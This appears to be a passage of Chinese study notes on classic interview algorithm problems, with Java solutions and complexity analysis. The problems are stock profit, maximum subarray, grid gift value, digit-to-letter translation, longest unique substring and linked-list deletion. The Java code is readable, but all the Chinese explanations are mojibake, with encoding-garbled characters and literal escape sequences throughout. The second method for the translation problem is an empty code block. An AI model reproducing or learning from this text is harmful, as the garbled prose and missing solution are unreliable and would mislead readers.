¼ã€‚\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: [7,6,4,3,1]\n>è¾“å‡º: 0\n>è§£é‡Š: åœ¨è¿™ç§æƒ…å†µä¸‹, æ²¡æœ‰äº¤æ˜“å®Œæˆ, æ‰€ä»¥æœ€å¤§åˆ©æ¶¦ä¸º 0ã€‚\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šæš´åŠ›æ³•\n\n```java\npublic class Solution {\n    public int maxProfit(int[] prices) {\n        int maxprofit = 0;\n        for (int i = 0; i < prices.length - 1; i++) {\n            for (int j = i + 1; j < prices.length; j++) {\n                int profit = prices[j] - prices[i];\n                if (profit > maxprofit) {\n                    maxprofit = profit;\n                }\n            }\n        }\n        return maxprofit;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šåŠ¨æ€è§„åˆ’\n\n![](https://img.jwt1399.top/img/202208171820656.png)\n\nå‰ i æ—¥æœ€å¤§åˆ©æ¶¦ = max(å‰(iâˆ’1)æ—¥æœ€å¤§åˆ©æ¶¦ï¼Œç¬¬iæ—¥ä»·æ ¼âˆ’å‰iæ—¥æœ€ä½ä»·æ ¼)\n\n`dp[i] = maxâ¡(dp[iâˆ’1], prices[i] âˆ’ minâ¡(prices[0:i]))`\n\n```java\nclass Solution {\n    public int maxProfit(int[] prices) {\n        if(prices.length == 0)return 0;\n      \tint[] dp = new int[prices.length];\n        dp[0] = 0; \n        int min = prices[0];\n        for(int i = 1; i < prices.length; i++){\n            min = Math.min(min,prices[i]);\n            dp[i] = Math.max(dp[i-1],prices[i]-min);\n        }\n        return dp[prices.length-1];\n    }\n}\n```\n\næ•ˆç‡ä¼˜åŒ–ï¼š\n\n- **æ—¶é—´å¤æ‚åº¦é™ä½ï¼š** å‰ iii æ—¥çš„æœ€ä½ä»·æ ¼ minâ¡(prices\\[0:i\\]) æ—¶é—´å¤æ‚åº¦ä¸º O(i)ã€‚è€Œåœ¨éå† prices æ—¶ï¼Œå¯ä»¥å€ŸåŠ©ä¸€ä¸ªå˜é‡ï¼ˆè®°ä¸ºæˆæœ¬ cost ï¼‰æ¯æ—¥æ›´æ–°æœ€ä½ä»·æ ¼ã€‚ä¼˜åŒ–åçš„è½¬ç§»æ–¹ç¨‹ä¸ºï¼š\n\n  `dp[i] = maxâ¡(dp[iâˆ’1],prices[i] - minâ¡(cost,prices[i])`\n\n- **ç©ºé—´å¤æ‚åº¦é™ä½ï¼š** ç”±äº dp\\[i] åªä¸ dp\\[iâˆ’1\\]ï¼Œ prices\\[i\\], cost ç›¸å…³ï¼Œå› æ­¤å¯ä½¿ç”¨ä¸€ä¸ªå˜é‡ï¼ˆè®°ä¸ºåˆ©æ¶¦ profitï¼‰ä»£æ›¿ dp åˆ—è¡¨ã€‚ä¼˜åŒ–åçš„è½¬ç§»æ–¹ç¨‹ä¸ºï¼š\n\n  `profit = maxâ¡(profit,prices[i] âˆ’ minâ¡(cost,prices[i])`\n\n```java\nclass Solution {\n    public int maxProfit(int[] prices) {\n        int cost = Integer.MAX_VALUE, profit = 0;\n        for(int price : prices) {\n            cost = Math.min(cost, price);\n            profit = Math.max(profit, price - cost);\n        }\n        return profit;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n-   æ—¶é—´å¤æ‚åº¦ï¼šO(n<sup>2</sup>)ã€‚å¾ªç¯è¿è¡Œ (nâˆ’1)+(nâˆ’2)+â‹¯+2+1\\=n(nâˆ’1)/2 æ¬¡ã€‚\n-   ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚åªä½¿ç”¨äº†å¸¸æ•°ä¸ªå˜é‡ã€‚\n\n#### æ–¹æ³•2\n\n-   æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œåªéœ€è¦éå†ä¸€æ¬¡ã€‚\n-   ç©ºé—´å¤æ‚åº¦ï¼šO(1)ï¼Œåªä½¿ç”¨äº†å¸¸æ•°ä¸ªå˜é‡ã€‚\n\n# ç¬¬ 9 å¤© åŠ¨æ€è§„åˆ’ï¼ˆä¸­ç­‰ï¼‰\n\n## 42.è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ\n\n### é¢˜ç›®\n\n> è¾“å…¥ä¸€ä¸ªæ•´å‹æ•°ç»„ï¼Œæ•°ç»„ä¸­çš„ä¸€ä¸ªæˆ–è¿ç»­å¤šä¸ªæ•´æ•°ç»„æˆä¸€ä¸ªå­æ•°ç»„ã€‚æ±‚æ‰€æœ‰å­æ•°ç»„çš„å’Œçš„æœ€å¤§å€¼ã€‚\n>\n> è¦æ±‚æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚\n>\n> ç¤ºä¾‹1:\n>\n> ```\n> è¾“å…¥: nums = [-2,1,-3,4,-1,2,1,-5,4]\n> è¾“å‡º: 6\n> è§£é‡Š: è¿ç»­å­æ•°ç»„ [4,-1,2,1] çš„å’Œæœ€å¤§ï¼Œä¸º 6ã€‚\n> ```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208171820679.png)\n\n```java\nclass Solution {\n    public int maxSubArray(int[] nums) {\n    int dp[] = new int[nums.length];\n    dp[0] = nums[0];\n    int res = dp[0];\n    for(int i = 1; i < nums.length; i++){\n        dp[i] = Math.max(dp[i - 1] + nums[i], nums[i]);\n        res = Math.max(res, dp[i]);\n    }\n        return res;\n    }\n}\n\n//ç”±äº dp[i] åªä¸ dp[i-1] å’Œ nums[i] æœ‰å…³ç³»ï¼Œå› æ­¤å¯ä»¥å°†åŸæ•°ç»„ nums ç”¨ä½œ dp åˆ—è¡¨ï¼Œå³ç›´æ¥åœ¨ nums ä¸Šä¿®æ”¹å³å¯ã€‚\nclass Solution {\n    public int maxSubArray(int[] nums) {\n        int res = nums[0];\n        for(int i = 1; i < nums.length; i++) {\n            nums[i] += Math.max(nums[i - 1], 0);\n            res = Math.max(res, nums[i]);\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** çº¿æ€§éå†æ•°ç»„ nums å³å¯è·å¾—ç»“æœï¼Œä½¿ç”¨ O(N) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 47.ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼\n\n### é¢˜ç›®\n\n> åœ¨ä¸€ä¸ª m*n çš„æ£‹ç›˜çš„æ¯ä¸€æ ¼éƒ½æ”¾æœ‰ä¸€ä¸ªç¤¼ç‰©ï¼Œæ¯ä¸ªç¤¼ç‰©éƒ½æœ‰ä¸€å®šçš„ä»·å€¼ï¼ˆä»·å€¼å¤§äº 0ï¼‰ã€‚ä½ å¯ä»¥ä»æ£‹ç›˜çš„å·¦ä¸Šè§’å¼€å§‹æ‹¿æ ¼å­é‡Œçš„ç¤¼ç‰©ï¼Œå¹¶æ¯æ¬¡å‘å³æˆ–è€…å‘ä¸‹ç§»åŠ¨ä¸€æ ¼ã€ç›´åˆ°åˆ°è¾¾æ£‹ç›˜çš„å³ä¸‹è§’ã€‚ç»™å®šä¸€ä¸ªæ£‹ç›˜åŠå…¶ä¸Šé¢çš„ç¤¼ç‰©çš„ä»·å€¼ï¼Œè¯·è®¡ç®—ä½ æœ€å¤šèƒ½æ‹¿åˆ°å¤šå°‘ä»·å€¼çš„ç¤¼ç‰©ï¼Ÿ\n>\n> ç¤ºä¾‹ 1:\n>\n> ```\n> è¾“å…¥: \n> [\n>   [1,3,1],\n>   [1,5,1],\n>   [4,2,1]\n> ]\n> è¾“å‡º: 12\n> è§£é‡Š: è·¯å¾„ 1â†’3â†’5â†’2â†’1 å¯ä»¥æ‹¿åˆ°æœ€å¤šä»·å€¼çš„ç¤¼ç‰©\n> ```\n\n### è§£ç­”\n\nè®¾åŠ¨æ€è§„åˆ’çŸ©é˜µ dp ï¼Œdp(i,j) ä»£è¡¨ä»æ£‹ç›˜çš„å·¦ä¸Šè§’å¼€å§‹ï¼Œåˆ°è¾¾å•å…ƒæ ¼ (i,j) æ—¶èƒ½æ‹¿åˆ°ç¤¼ç‰©çš„æœ€å¤§ç´¯è®¡ä»·å€¼ã€‚\n\n-   å½“ i\\=0 ä¸” j\\=0 æ—¶ï¼Œä¸ºèµ·å§‹å…ƒç´ ï¼›\n-   å½“ i\\=0 ä¸” jâ‰ 0 æ—¶ï¼Œä¸ºçŸ©é˜µç¬¬ä¸€è¡Œå…ƒç´ ï¼Œåªå¯ä»å·¦è¾¹åˆ°è¾¾ï¼›\n-   å½“ iâ‰ 0 ä¸” j\\=0 æ—¶ï¼Œä¸ºçŸ©é˜µç¬¬ä¸€åˆ—å…ƒç´ ï¼Œåªå¯ä»ä¸Šè¾¹åˆ°è¾¾ï¼›\n-   å½“ iâ‰ 0 ä¸” jâ‰ 0 æ—¶ï¼Œå¯ä»å·¦è¾¹æˆ–ä¸Šè¾¹åˆ°è¾¾ï¼›\n\n![](https://img.jwt1399.top/img/202208181212232.png)\n\n```java\nclass Solution {\n    public int maxValue(int[][] grid) {\n        int m = grid.length;\n        int n = grid[0].length;\n        int [][]dp = new int[m][n];\n        for(int i = 0; i < m; i++){\n            for(int j = 0; j < n; j++){\n                if(i == 0 && j == 0) \n                  dp[i][j] = grid[0][0];\n                else if(i == 0) \n                    dp[i][j] = dp[i][j - 1] + grid[i][j]; \n                else if(j == 0)  \n                    dp[i][j] = dp[i - 1][j] + grid[i][j]; \n                else\n                    dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]) + grid[i][j];\n            }\n        }\n        return dp[m - 1][n - 1];\n    }\n}\n\n//ä¼˜åŒ–\n/**\n  ç”±äº dp[i][j] åªä¸ dp[i-1][j] , dp[i][j-1] , grid[i][j]æœ‰å…³ç³»ï¼Œå› æ­¤å¯ä»¥å°†åŸçŸ©é˜µ grid ç”¨ä½œ dp çŸ©é˜µï¼Œå³ç›´æ¥åœ¨ grid ä¸Šä¿®æ”¹å³å¯ã€‚åº”ç”¨æ­¤æ–¹æ³•å¯çœå» dp çŸ©é˜µä½¿ç”¨çš„é¢å¤–ç©ºé—´ï¼Œå› æ­¤ç©ºé—´å¤æ‚åº¦ä» O(MN) é™è‡³ O(1)\n**/\nclass Solution {\n    public int maxValue(int[][] grid) {\n        int m = grid.length, n = grid[0].length;\n        for(int i = 0; i < m; i++) {\n            for(int j = 0; j < n; j++) {\n                if(i == 0 && j == 0) continue;\n                if(i == 0) grid[i][j] += grid[i][j - 1];\n                else if(j == 0) grid[i][j] += grid[i - 1][j];\n                else grid[i][j] += Math.max(grid[i][j - 1], grid[i - 1][j]);\n            }\n        }\n        return grid[m - 1][n - 1];\n    }\n}\n//å†ä¼˜åŒ–\n/**\n  ä»¥ä¸Šä»£ç é€»è¾‘æ¸…æ™°ï¼Œå’Œè½¬ç§»æ–¹ç¨‹ç›´æ¥å¯¹åº”ï¼Œä½†ä»å¯æå‡æ•ˆç‡ï¼šå½“ grid çŸ©é˜µå¾ˆå¤§æ—¶ï¼Œ i = 0 æˆ– j = 0 çš„æƒ…å†µä»…å æå°‘æ•°ï¼Œç›¸å½“å¾ªç¯æ¯è½®éƒ½å†—ä½™äº†ä¸€æ¬¡åˆ¤æ–­ã€‚å› æ­¤ï¼Œå¯å…ˆåˆå§‹åŒ–çŸ©é˜µç¬¬ä¸€è¡Œå’Œç¬¬ä¸€åˆ—ï¼Œå†å¼€å§‹éå†é€’æ¨ã€‚\n**/\nclass Solution {\n    public int maxValue(int[][] grid) {\n        int m = grid.length, n = grid[0].length;\n        for(int j = 1; j < n; j++) // åˆå§‹åŒ–ç¬¬ä¸€è¡Œ\n            grid[0][j] += grid[0][j - 1];\n        for(int i = 1; i < m; i++) // åˆå§‹åŒ–ç¬¬ä¸€åˆ—\n            grid[i][0] += grid[i - 1][0];\n        for(int i = 1; i < m; i++)\n            for(int j = 1; j < n; j++) \n                grid[i][j] += Math.max(grid[i][j - 1], grid[i - 1][j]);\n        return grid[m - 1][n - 1];\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(MN) ï¼š** M,N åˆ†åˆ«ä¸ºçŸ©é˜µè¡Œé«˜ã€åˆ—å®½ï¼›åŠ¨æ€è§„åˆ’éœ€éå†æ•´ä¸ª grid çŸ©é˜µï¼Œä½¿ç”¨ O(MN) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** åŸåœ°ä¿®æ”¹ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 10 å¤© åŠ¨æ€è§„åˆ’ï¼ˆä¸­ç­‰ï¼‰\n\n## 46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬æŒ‰ç…§å¦‚ä¸‹è§„åˆ™æŠŠå®ƒç¿»è¯‘ä¸ºå­—ç¬¦ä¸²ï¼š0 ç¿»è¯‘æˆ â€œaâ€ ï¼Œ1 ç¿»è¯‘æˆ â€œbâ€ï¼Œâ€¦â€¦ï¼Œ11 ç¿»è¯‘æˆ â€œlâ€ï¼Œâ€¦â€¦ï¼Œ25 ç¿»è¯‘æˆ â€œzâ€ã€‚ä¸€ä¸ªæ•°å­—å¯èƒ½æœ‰å¤šä¸ªç¿»è¯‘ã€‚è¯·ç¼–ç¨‹å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è®¡ç®—ä¸€ä¸ªæ•°å­—æœ‰å¤šå°‘ç§ä¸åŒçš„ç¿»è¯‘æ–¹æ³•ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: 12258\n>è¾“å‡º: 5\n>è§£é‡Š: 12258æœ‰5ç§ä¸åŒçš„ç¿»è¯‘ï¼Œåˆ†åˆ«æ˜¯\"bccfi\", \"bwfi\", \"bczi\", \"mcfi\"å’Œ\"mzi\"\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208181400798.png)\n\n**çŠ¶æ€å®šä¹‰ï¼š**è®°æ•°å­— num ç¬¬ i ä½æ•°å­—ä¸º x<sub>i</sub> ï¼Œæ•°å­— num çš„ä½æ•°ä¸º n ï¼›dp[i] ä»£è¡¨ä»¥ x<sub>i</sub> ä¸ºç»“å°¾çš„æ•°å­—çš„ç¿»è¯‘æ–¹æ¡ˆæ•°é‡ã€‚\n\n**è½¬ç§»æ–¹ç¨‹ï¼š**å¯è¢«ç¿»è¯‘çš„ä¸¤ä½æ•°åŒºé—´ï¼šå½“ x<sub>iâˆ’1Â </sub>= 0 æ—¶ï¼Œç»„æˆçš„ä¸¤ä½æ•°æ˜¯æ— æ³•è¢«ç¿»è¯‘çš„ï¼ˆä¾‹å¦‚ 00,01,02,â‹¯ ï¼‰ï¼Œå› æ­¤ x<sub>iâˆ’1</sub>x<sub>iÂ </sub>çš„åŒºé—´ä¸º \\[10,25\\] ã€‚\n\n![](https://img.jwt1399.top/img/202208181407897.png)\n\n**åˆå§‹çŠ¶æ€ï¼š** dp\\[0\\] = dp[1] = 1ï¼Œå³ â€œæ— æ•°å­—â€ å’Œ â€œç¬¬ 1 ä½æ•°å­—â€ çš„ç¿»è¯‘æ–¹æ³•æ•°é‡å‡ä¸º 1 \n\n> Qï¼š æ— æ•°å­—æƒ…å†µ dp[0] = 1 ä»ä½•è€Œæ¥ï¼Ÿ\n> Aï¼š å½“ num ç¬¬ 1, 2 ä½çš„ç»„æˆçš„æ•°å­— âˆˆ[10,25] æ—¶ï¼Œæ˜¾ç„¶åº”æœ‰ 2 ç§ç¿»è¯‘æ–¹æ³•ï¼Œå³ dp[2] = dp[1] + dp[0] = 2 ï¼Œè€Œæ˜¾ç„¶ dp[1] = 1 ï¼Œå› æ­¤æ¨å‡º dp[0] = 1 ã€‚\n\n#### æ–¹æ³•1ï¼š**å­—ç¬¦ä¸²éå†**\n\n```java\nclass Solution {\n    public int translateNum(int num) {\n        String s = String.valueOf(num);\n        int []dp = new int[s.length()+1];\n        dp[0] = dp[1] = 1;\n        for(int i = 2; i <= s.length(); i++){\n            String tmp = s.substring(i - 2, i);\n            if(tmp.compareTo(\"10\") >= 0 && tmp.compareTo(\"25\") <= 0)\n                dp[i] = dp[i-1] + dp[i-2];\n            else\n                dp[i] = dp[i-1];\n        }\n        return dp[s.length()];\n    }\n}\n\n//ä¼˜åŒ–\n//ç”±äº dp[i]åªä¸ dp[i - 1]å’Œ dp[i - 2]æœ‰å…³ï¼Œå› æ­¤å¯ä½¿ç”¨å˜é‡ a,b,c åˆ†åˆ«è®°å½•ï¼Œä¸¤å˜é‡äº¤æ›¿å‰è¿›å³å¯ã€‚æ­¤æ–¹æ³•å¯çœå» dp åˆ—è¡¨ä½¿ç”¨çš„ O(N) çš„é¢å¤–ç©ºé—´ã€‚\nclass Solution {\n    public int translateNum(int num) {\n        String s = String.valueOf(num);\n        int a = 1, b = 1;\n        for(int i = 2; i <= s.length(); i++) {\n            String tmp = s.substring(i - 2, i);\n            int c = tmp.compareTo(\"10\") >= 0 && tmp.compareTo(\"25\") <= 0 ? a + b : a;\n            b = a;\n            a = c;\n        }\n        return a;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼š**æ•°å­—æ±‚ä½™**\n\nä¸Šè¿°æ–¹æ³•è™½ç„¶å·²ç»èŠ‚çœäº† dp åˆ—è¡¨çš„ç©ºé—´å ç”¨ï¼Œä½†å­—ç¬¦ä¸² s ä»ä½¿ç”¨äº† O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n- **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** N ä¸ºå­—ç¬¦ä¸² s çš„é•¿åº¦ï¼ˆå³æ•°å­— num çš„ä½æ•° logâ¡(num) ï¼‰ï¼Œå…¶å†³å®šäº†å¾ªç¯æ¬¡æ•°ã€‚\n\n-   **ç©ºé—´å¤æ‚åº¦ O(N)ï¼š** å­—ç¬¦ä¸² s å’Œ dp åˆ†åˆ«ä½¿ç”¨ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n#### æ–¹æ³•2\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** åŒæ–¹æ³•1\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å‡ ä¸ªå˜é‡ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 48. æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦\n\n### é¢˜ç›®\n\n>è¯·ä»å­—ç¬¦ä¸²ä¸­æ‰¾å‡ºä¸€ä¸ªæœ€é•¿çš„ä¸åŒ…å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²ï¼Œè®¡ç®—è¯¥æœ€é•¿å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>è¾“å…¥: \"abcabcbb\"\n>è¾“å‡º: 3 \n>è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ \"abc\"ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚\n>ç¤ºä¾‹ 2:\n>\n>è¾“å…¥: \"bbbbb\"\n>è¾“å‡º: 1\n>è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ \"b\"ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 1ã€‚\n>ç¤ºä¾‹ 3:\n>\n>è¾“å…¥: \"pwwkew\"\n>è¾“å‡º: 3\n>è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ \"wke\"ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚\n>è¯·æ³¨æ„ï¼Œä½ çš„ç­”æ¡ˆå¿…é¡»æ˜¯ å­ä¸² çš„é•¿åº¦ï¼Œ\"pwke\" æ˜¯ä¸€ä¸ªå­åºåˆ—ï¼Œä¸æ˜¯å­ä¸²ã€‚\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208192027792.png)\n\nç”±äºè¿”å›å€¼æ˜¯å– dp åˆ—è¡¨æœ€å¤§å€¼ï¼Œå› æ­¤å¯å€ŸåŠ©å˜é‡ tmp å­˜å‚¨ dp[j]ï¼Œå˜é‡ res æ¯è½®æ›´æ–°æœ€å¤§å€¼ã€‚æ­¤ä¼˜åŒ–å¯èŠ‚çœ dp åˆ—è¡¨ä½¿ç”¨çš„ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n#### **æ–¹æ³•1ï¼šåŠ¨æ€è§„åˆ’ + å“ˆå¸Œè¡¨**\n\n- å“ˆå¸Œè¡¨ç»Ÿè®¡ï¼š éå†å­—ç¬¦ä¸² s æ—¶ï¼Œä½¿ç”¨å“ˆå¸Œè¡¨ï¼ˆè®°ä¸º dic ï¼‰ç»Ÿè®¡å„å­—ç¬¦æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ä½ç½®\n- å·¦è¾¹ç•Œ i è·å–æ–¹å¼ï¼š éå†åˆ° s[j] æ—¶ï¼Œå¯é€šè¿‡è®¿é—®å“ˆå¸Œè¡¨ dic[s[j]] è·å–æœ€è¿‘çš„ç›¸åŒå­—ç¬¦çš„ç´¢å¼• i\n\n```java\nclass Solution {\n    public int lengthOfLongestSubstring(String s) {\n        Map<Character,Integer> dic = new HashMap<>();\n        int tmp = 0, res = 0;\n        for(int j = 0; j < s.length(); j++){\n            int i = dic.getOrDefault(s.charAt(j), -1);// è·å–ç´¢å¼• i\n            dic.put(s.charAt(j),j);// æ›´æ–°å“ˆå¸Œè¡¨\n            if(tmp < j - i) tmp = tmp + 1;\n            else tmp = j - i;\n            res = Math.max(tmp,res);// max(dp[j - 1], dp[j])\n        }\n        return res;\n    }\n}\n```\n\nJava çš„ getOrDefault(key, default)ï¼Œ ä»£è¡¨å½“å“ˆå¸Œè¡¨åŒ…å«é”® key æ—¶è¿”å›å¯¹åº” value ï¼Œä¸åŒ…å«æ—¶è¿”å›é»˜è®¤å€¼ default\n\n### å¤æ‚åº¦\n\næ—¶é—´å¤æ‚åº¦ O(N) ï¼š å…¶ä¸­ N ä¸ºå­—ç¬¦ä¸²é•¿åº¦ï¼ŒåŠ¨æ€è§„åˆ’éœ€éå†è®¡ç®— dp åˆ—è¡¨ã€‚\nç©ºé—´å¤æ‚åº¦ O(1)ï¼š å­—ç¬¦çš„ ASCII ç èŒƒå›´ä¸º 00 ~ 127 ï¼Œå“ˆå¸Œè¡¨ dic æœ€å¤šä½¿ç”¨ O(128) = O(1) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 11 å¤© åŒæŒ‡é’ˆï¼ˆç®€å•ï¼‰\n\n## 18. åˆ é™¤é“¾è¡¨çš„èŠ‚ç‚¹\n\n### é¢˜ç›®\n\n>ç»™å®šå•å‘é“¾è¡¨çš„å¤´æŒ‡é’ˆå’Œä¸€ä¸ªè¦åˆ é™¤çš„èŠ‚ç‚¹çš„å€¼ï¼Œå®šä¹‰ä¸€ä¸ªå‡½æ•°åˆ é™¤è¯¥èŠ‚ç‚¹ã€‚\n>\n>è¿”å›åˆ é™¤åçš„é“¾è¡¨çš„å¤´èŠ‚ç‚¹ã€‚\n>\n>æ³¨æ„ï¼šæ­¤é¢˜å¯¹æ¯”åŸé¢˜æœ‰æ”¹åŠ¨\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: head = [4,5,1,9], val = 5\n>è¾“å‡º: [4,1,9]\n>è§£é‡Š: ç»™å®šä½ é“¾è¡¨ä¸­å€¼ä¸º 5 çš„ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨äº†ä½ çš„å‡½æ•°ä¹‹åï¼Œè¯¥é“¾è¡¨åº”å˜ä¸º 4 -> 1 -> 9.\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: head = [4,5,1,9], val = 1\n>è¾“å‡º: [4,5,9]\n>è§£é‡Š: ç»™å®šä½ é“¾è¡¨ä¸­å€¼ä¸º 1 çš„ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨äº†ä½ çš„å‡½æ•°ä¹‹åï¼Œè¯¥é“¾è¡¨åº”å˜ä¸º 4 -> 5 -> 9.\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208192027335.png)\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **ç‰¹ä¾‹å¤„ç†ï¼š** å½“åº”åˆ é™¤å¤´èŠ‚ç‚¹ `head` æ—¶ï¼Œç›´æ¥è¿”å› `head.next` å³å¯ã€‚\n2.  **åˆå§‹åŒ–ï¼š** `pre = head` , `cur = head.next` ã€‚\n3.  **å®šä½èŠ‚ç‚¹ï¼š** å½“ `cur` ä¸ºç©º **æˆ–** `cur` èŠ‚ç‚¹å€¼ç­‰äº `val` æ—¶è·³å‡ºã€‚\n    1.  ä¿å­˜å½“å‰èŠ‚ç‚¹ç´¢å¼•ï¼Œå³ `pre = cur` ã€‚\n    2.  éå†ä¸‹ä¸€èŠ‚ç‚¹ï¼Œå³ `cur = cur.next` ã€‚\n4.  **åˆ é™¤èŠ‚ç‚¹ï¼š** è‹¥ `cur` æŒ‡å‘å¾…åˆ é™¤èŠ‚ç‚¹ï¼Œåˆ™æ‰§è¡Œ `pre.next = cur.next` ï¼›è‹¥ `cur` æŒ‡å‘ nullï¼Œä»£è¡¨é“¾è¡¨ä¸­ä¸åŒ…å«å€¼ä¸º `val` çš„èŠ‚ç‚¹ã€‚\n5.  **è¿”å›å€¼ï¼š** è¿”å›é“¾è¡¨å¤´éƒ¨èŠ‚ç‚¹ `head` å³å¯ã€‚\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public ListNode deleteNode(ListNode head, int val) {\n        if(head.val == val) return head.next;\n        ListNode pre = head, cur = head.next;\n        while(cur != null && cur.val != val){\n          pre = cur;\n          cur = cur.next;\n        }\n        if(cur.val == val)\n            pre.next = cur.next;\n        return head;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** N ä¸ºé“¾è¡¨é•¿åº¦ï¼Œåˆ é™¤æ“ä½œå¹³å‡éœ€å¾ªç¯ N/2 æ¬¡ï¼Œæœ€å·® N æ¬¡ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** `cur`, `pre` å ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n## 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªé“¾è¡¨ï¼Œè¾“å‡ºè¯¥é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹ã€‚ä¸ºäº†ç¬¦åˆå¤§å¤šæ•°äººçš„ä¹ æƒ¯ï¼Œæœ¬é¢˜ä»1å¼€å§‹è®¡æ•°ï¼Œå³é“¾è¡¨çš„å°¾èŠ‚ç‚¹æ˜¯å€’æ•°ç¬¬1ä¸ªèŠ‚ç‚¹ã€‚\n>\n>ä¾‹å¦‚ï¼Œä¸€ä¸ªé“¾è¡¨æœ‰ 6 ä¸ªèŠ‚ç‚¹ï¼Œä»å¤´èŠ‚ç‚¹å¼€å§‹ï¼Œå®ƒä»¬çš„å€¼ä¾æ¬¡æ˜¯ 1ã€2ã€3ã€4ã€5ã€6ã€‚è¿™ä¸ªé“¾è¡¨çš„å€’æ•°ç¬¬ 3 ä¸ªèŠ‚ç‚¹æ˜¯å€¼ä¸º 4 çš„èŠ‚ç‚¹ã€‚\n>\n>ç¤ºä¾‹ï¼š\n>\n>```\n>ç»™å®šä¸€ä¸ªé“¾è¡¨: 1->2->3->4->5, å’Œ k = 2.\n>\n>è¿”å›é“¾è¡¨ 4->5.\n>```\n\n### è§£ç­”\n\nç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„è§£æ³•ï¼š\n\n- å…ˆéå†ç»Ÿè®¡é“¾è¡¨é•¿åº¦ï¼Œè®°ä¸º n ï¼›\n- è®¾ç½®ä¸€ä¸ªæŒ‡é’ˆèµ° (n-k)æ­¥ï¼Œå³å¯æ‰¾åˆ°é“¾è¡¨å€’æ•°ç¬¬ k ä¸ªèŠ‚ç‚¹ã€‚\n\n![](https://img.jwt1399.top/img/202208201051016.png)\n\nä½¿ç”¨åŒæŒ‡é’ˆåˆ™å¯ä»¥ä¸ç”¨ç»Ÿè®¡é“¾è¡¨é•¿åº¦ã€‚\n\n![](https://img.jwt1399.top/img/202208201051503.png)\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **åˆå§‹åŒ–ï¼š** å‰æŒ‡é’ˆ `former` ã€åæŒ‡é’ˆ `latter` ï¼ŒåŒæŒ‡é’ˆéƒ½æŒ‡å‘å¤´èŠ‚ç‚¹ `head` \n2.  